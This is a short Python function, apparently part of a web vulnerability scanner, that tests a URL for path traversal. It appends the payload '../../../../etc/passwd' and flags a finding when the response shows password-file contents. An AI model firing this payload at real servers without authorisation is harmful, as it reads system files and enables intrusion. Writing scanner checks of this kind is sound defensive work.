import requests


def check_path_traversal(url):

    payload = "../../../../etc/passwd"
    test_url = url + payload

    try:
        r = requests.get(test_url, timeout=5)

        if "root:x:" in r.text:
            return {
                "type": "Path Traversal",
                "url": test_url,
                "confidence": 85
            }
    except:
        pass

    return None
